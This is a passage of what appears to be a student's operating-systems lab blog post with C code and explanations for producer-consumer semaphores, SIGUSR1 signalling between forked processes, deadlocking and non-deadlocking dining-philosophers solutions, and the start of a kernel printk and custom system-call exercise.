class="type">int</span> consumer_ids[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize mutex with default attributes</span></span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// Second parameter 0 means semaphore is used for inter-thread synchronization</span></span><br><span class="line">    sem_init(&amp;empty, <span class="number">0</span>, BUFFER_SIZE); <span class="comment">// Start with BUFFER_SIZE empty slots</span></span><br><span class="line">    sem_init(&amp;full, <span class="number">0</span>, <span class="number">0</span>);            <span class="comment">// Start with no products available for consumption</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create producer and consumer threads</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;producers[i], <span class="literal">NULL</span>, producer, &amp;producer_ids[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;consumers[i], <span class="literal">NULL</span>, consumer, &amp;consumer_ids[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait for threads to finish</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(producers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(consumers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destroy mutex and semaphores</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    sem_destroy(&amp;empty);</span><br><span class="line">    sem_destroy(&amp;full);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Code Analysis:</p><p>First, we should add a mutex lock to the product area to prevent simultaneous access by multiple threads. Then we need to ensure that when the product buffer is full, producers stop producing, and when there are no products, consumers cannot consume. So we need P-V operations to complete the synchronization mechanism. The empty signal represents the current empty slots in the buffer. Whenever a producer starts producing, empty slots decrease by 1; after a consumer consumes, empty slots increase by 1. The full signal represents the current number of products in the buffer. When a consumer starts consuming, it decreases by 1; when a producer finishes producing, it increases by 1. This implements the synchronization mechanism between producers and consumers.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Producer*/</span></span><br><span class="line">sem_wait(&amp;empty);</span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Store product in buffer</span></span><br><span class="line">buffer[in] = product;</span><br><span class="line">in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Producer %d produced %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">sem_post(&amp;full);</span><br><span class="line"><span class="comment">/*Producer*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Consumer*/</span></span><br><span class="line">sem_wait(&amp;full);</span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Take product from buffer</span></span><br><span class="line"><span class="type">int</span> product = buffer[out];</span><br><span class="line">out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Consumer %d consumed %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">sem_post(&amp;empty);</span><br><span class="line"><span class="comment">/*Consumer*/</span></span><br></pre></td></tr></table></figure><p>Program execution result is as follows:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/4-result.png" alt="Program execution result"></p><p>Use ps command to view all threads in the current process:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/4-ps.png" alt="Use ps command to view all threads in the current process"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/WCHAN-explain.png" alt="WCHAN explanation"></p><p>Reference Materials:</p><p><a href="https://blog.csdn.net/star_fighting/article/details/104309371">Thread Synchronization Problem - Producer Consumer</a></p><h2 id="Task-5-Use-Signal-Mechanism-signal-to-Implement-Inter-Process-Communication-in-Linux"><a href="#Task-5-Use-Signal-Mechanism-signal-to-Implement-Inter-Process-Communication-in-Linux" class="headerlink" title="Task 5: Use Signal Mechanism (signal) to Implement Inter-Process Communication in Linux"></a>Task 5: Use Signal Mechanism (signal) to Implement Inter-Process Communication in Linux</h2><p>Task Requirements:</p><ol><li>Parent process creates (fork) child process and makes child process enter infinite loop.</li><li>Child process outputs “I am Child Process, alive !\n” every 2 seconds</li><li>Parent process asks user “To terminate Child Process. Yes or No? \n” requiring user to answer Y or N from keyboard. If user answers N, delay 2 seconds before asking again.</li><li>If user answers Y, send user signal to child process to make it end.</li><li>Before child process ends, print string: “Bye,World !\n”</li><li>Functions: kill(), signal(), use user signal, write signal handler function</li></ol><p>The core of this task is to use the kill function to terminate the child process, and pass a signal SIGUSR1 when killing (user-defined signal that can be used to report abnormal behavior such as division by zero errors, segmentation faults, etc., or to control processes such as terminating processes, stopping (pausing) processes, continuing (resuming) stopped processes, etc.). The child process receives the signal and calls the signalHandler signal processing function to perform corresponding operations.</p><p>Source code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Signal handler function</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signalHandler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bye, World!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Child process</span></span><br><span class="line">    </span><br><span class="line">        signal(SIGUSR1, signalHandler); <span class="comment">// Register signal handler function</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;I am Child Process, alive!\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Parent process</span></span><br><span class="line">        <span class="type">char</span> answer;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;To terminate Child Process. Yes or No?\n&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;answer);</span><br><span class="line">            <span class="keyword">if</span> (answer == <span class="string">&#x27;N&#x27;</span> || answer == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (answer != <span class="string">&#x27;Y&#x27;</span> &amp;&amp; answer != <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        kill(pid, SIGUSR1); <span class="comment">// Send SIGUSR1 signal to child process</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// Wait for child process to end</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// fork failed</span></span><br><span class="line">        perror(<span class="string">&quot;fork failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Code execution result:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/5-result.png" alt="Code execution result"></p><p>Reference Materials:</p><p><a href="https://zhuanlan.zhihu.com/p/113876980">Linux Inter-Process Communication Lecture 3 Signal signal kill</a></p><h2 id="Task-6-Simulate-Dining-Philosophers-in-Windows-or-Linux-Provide-Deadlock-and-Non-Deadlock-Solutions"><a href="#Task-6-Simulate-Dining-Philosophers-in-Windows-or-Linux-Provide-Deadlock-and-Non-Deadlock-Solutions" class="headerlink" title="Task 6: Simulate Dining Philosophers in Windows or Linux, Provide Deadlock and Non-Deadlock Solutions"></a>Task 6: Simulate Dining Philosophers in Windows or Linux, Provide Deadlock and Non-Deadlock Solutions</h2><p>Task Requirements:</p><ol><li>Provide both solutions that may cause deadlock and solutions that cannot cause deadlock.</li><li>For solutions that may cause deadlock, refer to course materials. Windows try using critical section objects (EnterCriticalSection, LeaveCriticalSection); Linux try using mutex locks (pthread_mutex_lock, pthread_mutex_unlock)</li><li>Solutions that absolutely cannot cause deadlock, for example: try to pick up both chopsticks, if both can be picked up then pick them up, otherwise don’t pick up either.</li><li>Linux try mutex functions pthread_mutex_lock, pthread_mutex_trylock, etc.</li><li>To enhance randomness, maintain random duration of 100ms-500ms between states.</li><li>[Optional] Graphical interface showing philosophers picking up chopsticks, eating, putting down chopsticks, thinking, etc.</li></ol><h3 id="Deadlock-Solution"><a href="#Deadlock-Solution" class="headerlink" title="Deadlock Solution"></a>Deadlock Solution</h3><p>The problem with the deadlock solution is that each philosopher picks up the left chopstick first, then the right chopstick. When they all pick up the left chopstick simultaneously, no philosopher can get the right chopstick, creating a deadlock problem.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHILOSOPHER_COUNT 5</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> chopsticks[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_random_sleep_time</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> rand() % <span class="number">400000</span> + <span class="number">100000</span>; <span class="comment">// 100ms到500ms的随机时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">philosopher</span><span class="params">(<span class="type">void</span> *num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)num;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is thinking\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random thinking time</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is resting\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random rest time</span></span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;chopsticks[id]); <span class="comment">// Pick up left chopstick</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d picked up left chopstick\n&quot;</span>, id);</span><br><span class="line">        pthread_mutex_lock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]); <span class="comment">// Pick up right chopstick</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d picked up right chopstick\n&quot;</span>, id);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is eating\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random eating time</span></span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]); <span class="comment">// Put down right chopstick</span></span><br><span class="line">        pthread_mutex_unlock(&amp;chopsticks[id]);                           <span class="comment">// Put down left chopstick</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> philosophers[PHILOSOPHER_COUNT];</span><br><span class="line">    <span class="type">int</span> philosopher_numbers[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_mutex_init(&amp;chopsticks[i], <span class="literal">NULL</span>);</span><br><span class="line">        philosopher_numbers[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;philosophers[i], <span class="literal">NULL</span>, philosopher, &amp;philosopher_numbers[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(philosophers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Deadlock state:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/6-program1-result.png" alt="Deadlock state"></p><p>It can be observed that they all picked up the left chopsticks simultaneously, creating a deadlock phenomenon.</p><h3 id="Non-Deadlock-Solution"><a href="#Non-Deadlock-Solution" class="headerlink" title="Non-Deadlock Solution"></a>Non-Deadlock Solution</h3><p>My solution to deadlock is that philosophers try to pick up the left chopstick first, then the right chopstick. Unlike the above, if philosophers cannot get the right chopstick to eat, they put down the left chopstick they currently hold, thus avoiding the deadlock problem.</p><p>In terms of specific functions: pthread_mutex_trylock function replaces pthread_mutex_lock to avoid blocking. If the lock cannot be acquired immediately, it won’t enter a waiting state, thus avoiding deadlock situations.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHILOSOPHER_COUNT 5</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> chopsticks[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_random_sleep_time</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> rand() % <span class="number">400000</span> + <span class="number">100000</span>; <span class="comment">// 100ms到500ms的随机时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">philosopher</span><span class="params">(<span class="type">void</span> *num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)num;</span><br><span class="line">    <span class="type">int</span> left = id;</span><br><span class="line">    <span class="type">int</span> right = (id + <span class="number">1</span>) % PHILOSOPHER_COUNT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is thinking\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random thinking time</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is resting\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random thinking time</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Each philosopher tries to get the left chopstick first, then the right chopstick. If both chopsticks are successfully acquired, the philosopher starts eating</span></span><br><span class="line">        <span class="comment">// pthread_mutex_trylock function replaces pthread_mutex_lock to avoid blocking. If the lock cannot be acquired immediately, it won&#x27;t enter a waiting state, thus avoiding deadlock situations</span></span><br><span class="line">        <span class="keyword">if</span> (pthread_mutex_trylock(&amp;chopsticks[id]) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d picked up left chopstick\n&quot;</span>, id);</span><br><span class="line">            sleep(<span class="number">1</span>); <span class="comment">// Added a 1-second delay here to make it easier for philosophers to pick up left chopsticks simultaneously</span></span><br><span class="line">            <span class="keyword">if</span> (pthread_mutex_trylock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d picked up right chopstick\n&quot;</span>, id);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is eating\n&quot;</span>, id);</span><br><span class="line">                usleep(get_random_sleep_time()); <span class="comment">// Random eating time</span></span><br><span class="line"></span><br><span class="line">                pthread_mutex_unlock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d put down right chopstick\n&quot;</span>, id);</span><br><span class="line">            &#125;</span><br><span class="line">            pthread_mutex_unlock(&amp;chopsticks[id]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d put down left chopstick\n&quot;</span>, id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> philosophers[PHILOSOPHER_COUNT];</span><br><span class="line">    <span class="type">int</span> philosopher_numbers[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_mutex_init(&amp;chopsticks[i], <span class="literal">NULL</span>);</span><br><span class="line">        philosopher_numbers[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;philosophers[i], <span class="literal">NULL</span>, philosopher, &amp;philosopher_numbers[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(philosophers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Non-deadlock program execution result:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/6-program2-result.png" alt="Non-deadlock program execution result"></p><p>Here I intentionally made philosophers sleep for a longer time after getting the left chopstick, creating a conflict where they all get the left chopstick simultaneously. From the figure, we can see that all 5 philosophers indeed picked up the left chopsticks simultaneously. Unlike the deadlock approach, philosopher 4 actively put down the left chopstick and re-entered the thinking state, avoiding the deadlock situation.</p><p>Reference Materials:</p><p><a href="https://blog.csdn.net/monologuezjp/article/details/85449544">Dining Philosophers Problem</a></p><p><a href="https://blog.csdn.net/low5252/article/details/104800671">Five Philosophers Dining Problem</a></p><h2 id="Task-7-Study-Linux-Kernel-and-Use-printk-to-Debug-Process-Creation-and-Scheduling-Policy-Related-Information"><a href="#Task-7-Study-Linux-Kernel-and-Use-printk-to-Debug-Process-Creation-and-Scheduling-Policy-Related-Information" class="headerlink" title="Task 7: Study Linux Kernel and Use printk to Debug Process Creation and Scheduling Policy Related Information"></a>Task 7: Study Linux Kernel and Use printk to Debug Process Creation and Scheduling Policy Related Information</h2><p>Requirements: Write application Hello.c, call fork to create process, track the fork process of the newly created child process in the kernel and display PCB member variables related to scheduling policy.</p><ol><li>Write application Hello.c, call fork to create child process (functionality unlimited), print parent and child process ID numbers.</li><li>Use printk in appropriate locations in the kernel (such as somewhere in the do_fork function) to output debugging information like “currently creating process corresponding cmd, process ID and parent process ID”.</li><li>To avoid frequent output of the above debugging information by the do_fork function, it must be limited to only output the above debugging information when fork is called in the Hello program. Please think about how to implement this.</li></ol><blockquote><p>Reference method: Kernel design global variable bool flag and system call SetDebug(bool), SetDebug can modify flag value to true or false. In the Hello program, call SetDebug(true) before calling fork function and SetDebug(false) after calling fork function to modify flag. When printk debugging information, check flag to determine whether to use printk to output debugging information.</p></blockquote><p>Friendly reminder: The do_fork function has been replaced by the kernel_clone function in newer versions of Linux kernel source code.</p><h3 id="Modify-kernel-fork-c-file"><a href="#Modify-kernel-fork-c-file" class="headerlink" title="Modify .&#x2F;kernel&#x2F;fork.c file"></a>Modify .&#x2F;kernel&#x2F;fork.c file</h3><p>Use printk in kernel_clone to print related information. p is a pointer to the task_struct structure, comm is the currently executing command, pid is the child process ID, current-&gt;pid is the parent process ID, current is a macro pointing to the parent process.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-add_code.png" alt="Add printk code in kernel_clone"></p><p>Add new system call setdebug for setting debug_fork_flag. The bool value debug_fork_flag is a global variable used to control whether to output.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-setdebug.png" alt="setdebug system call"></p><h3 id="Add-Declarations"><a href="#Add-Declarations" class="headerlink" title="Add Declarations"></a>Add Declarations</h3><ol><li>System call: .&#x2F;kernel&#x2F;fork.c (already modified)</li><li>System call function declaration .&#x2F;include&#x2F;linux&#x2F;syscalls.h</li><li>ID: .&#x2F;arch&#x2F;x86&#x2F;entry&#x2F;syscalls&#x2F;syscall_64.tbl</li><li>ID declaration: .&#x2F;include&#x2F;uapi&#x2F;asm-generic&#x2F;unistd.h</li></ol><p>The modification operations for the remaining 3 files have been practiced in the task of adding system calls in experiment 1, so I won’t repeat them here.</p><h3 id="Compile-Kernel"><a 